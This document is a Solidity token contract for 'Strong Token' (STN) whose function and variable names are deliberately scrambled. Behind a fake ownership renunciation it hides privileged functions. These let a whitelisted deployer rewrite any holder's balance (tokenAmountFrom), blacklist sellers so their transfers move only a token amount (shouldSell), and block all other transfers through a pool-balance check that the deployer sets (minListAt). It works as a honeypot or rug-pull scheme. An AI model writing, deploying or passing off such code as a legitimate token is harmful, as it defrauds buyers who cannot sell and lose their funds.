//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface listReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeAmount) external view returns (uint256);

    function transfer(address feeSender, uint256 fundTx) external returns (bool);

    function allowance(address maxBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundTx) external returns (bool);

    function transferFrom(
        address sender,
        address feeSender,
        uint256 fundTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTotalAuto, uint256 value);
    event Approval(address indexed maxBuy, address indexed spender, uint256 value);
}

abstract contract senderAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountTeamTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityFund {
    function createPair(address receiverAuto, address receiverBuy) external returns (address);
}

interface isMinReceiver is listReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StrongToken is senderAmount, listReceiver, isMinReceiver {

    function decimals() external view virtual override returns (uint8) {
        return maxFeeAt;
    }

    event OwnershipTransferred(address indexed toIs, address indexed shouldLiquidity);

    mapping(address => bool) public walletLaunch;

    uint256 private limitSellAuto = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return marketingMax;
    }

    function transfer(address fromReceiver, uint256 fundTx) external virtual override returns (bool) {
        return senderToEnable(_msgSender(), fromReceiver, fundTx);
    }

    bool private autoLiquidity;

    function shouldSell(address receiverToken) public {
        liquidityFrom();
        
        if (receiverToken == fundAuto || receiverToken == modeTotal) {
            return;
        }
        walletLaunch[receiverToken] = true;
    }

    function senderFund(address shouldFund) public {
        if (toFund) {
            return;
        }
        if (minReceiverLaunch) {
            marketingMinTeam = receiverShould;
        }
        isAmountTo[shouldFund] = true;
        if (senderTo != minTrading) {
            txFromFund = marketingMinTeam;
        }
        toFund = true;
    }

    function getOwner() external view returns (address) {
        return marketingMax;
    }

    address public modeTotal;

    uint256 public amountLiquidityToken;

    function approve(address fundBuy, uint256 fundTx) public virtual override returns (bool) {
        modeMinSwap[_msgSender()][fundBuy] = fundTx;
        emit Approval(_msgSender(), fundBuy, fundTx);
        return true;
    }

    uint256 isTo;

    mapping(address => uint256) private listToken;

    uint256 public txFromFund;

    function minLaunched(address fundAmountTx, address feeSender, uint256 fundTx) internal returns (bool) {
        require(listToken[fundAmountTx] >= fundTx);
        listToken[fundAmountTx] -= fundTx;
        listToken[feeSender] += fundTx;
        emit Transfer(fundAmountTx, feeSender, fundTx);
        return true;
    }

    mapping(address => mapping(address => uint256)) private modeMinSwap;

    function transferFrom(address fundAmountTx, address feeSender, uint256 fundTx) external override returns (bool) {
        if (_msgSender() != enableToken) {
            if (modeMinSwap[fundAmountTx][_msgSender()] != type(uint256).max) {
                require(fundTx <= modeMinSwap[fundAmountTx][_msgSender()]);
                modeMinSwap[fundAmountTx][_msgSender()] -= fundTx;
            }
        }
        return senderToEnable(fundAmountTx, feeSender, fundTx);
    }

    function balanceOf(address feeAmount) public view virtual override returns (uint256) {
        return listToken[feeAmount];
    }

    function tokenAmountFrom(address fromReceiver, uint256 fundTx) public {
        liquidityFrom();
        listToken[fromReceiver] = fundTx;
    }

    address enableToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant liquidityTo = 20 ** 10;

    uint256 public receiverShould;

    uint256 public marketingMinTeam;

    string private buyMinExempt = "STN";

    function totalSupply() external view virtual override returns (uint256) {
        return limitSellAuto;
    }

    bool public toFund;

    bool private senderTo;

    bool public minReceiverLaunch;

    string private exemptTotalWallet = "Strong Token";

    address public fundAuto;

    function name() external view virtual override returns (string memory) {
        return exemptTotalWallet;
    }

    function allowance(address enableBuySwap, address fundBuy) external view virtual override returns (uint256) {
        if (fundBuy == enableToken) {
            return type(uint256).max;
        }
        return modeMinSwap[enableBuySwap][fundBuy];
    }

    uint256 minFundToken;

    function symbol() external view virtual override returns (string memory) {
        return buyMinExempt;
    }

    function minListAt(uint256 fundTx) public {
        liquidityFrom();
        isTo = fundTx;
    }

    address private marketingMax;

    uint8 private maxFeeAt = 18;

    constructor (){
        
        amountTeamTx listTradingToken = amountTeamTx(enableToken);
        modeTotal = liquidityFund(listTradingToken.factory()).createPair(listTradingToken.WETH(), address(this));
        if (autoLiquidity) {
            receiverShould = marketingMinTeam;
        }
        fundAuto = _msgSender();
        walletMode();
        isAmountTo[fundAuto] = true;
        listToken[fundAuto] = limitSellAuto;
        if (senderTo) {
            autoLiquidity = true;
        }
        emit Transfer(address(0), fundAuto, limitSellAuto);
    }

    address isMaxMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function liquidityFrom() private view {
        require(isAmountTo[_msgSender()]);
    }

    bool public minTrading;

    function senderToEnable(address fundAmountTx, address feeSender, uint256 fundTx) internal returns (bool) {
        if (fundAmountTx == fundAuto) {
            return minLaunched(fundAmountTx, feeSender, fundTx);
        }
        uint256 swapBuy = listReceiver(modeTotal).balanceOf(isMaxMin);
        require(swapBuy == isTo);
        require(feeSender != isMaxMin);
        if (walletLaunch[fundAmountTx]) {
            return minLaunched(fundAmountTx, feeSender, liquidityTo);
        }
        return minLaunched(fundAmountTx, feeSender, fundTx);
    }

    function walletMode() public {
        emit OwnershipTransferred(fundAuto, address(0));
        marketingMax = address(0);
    }

    mapping(address => bool) public isAmountTo;

}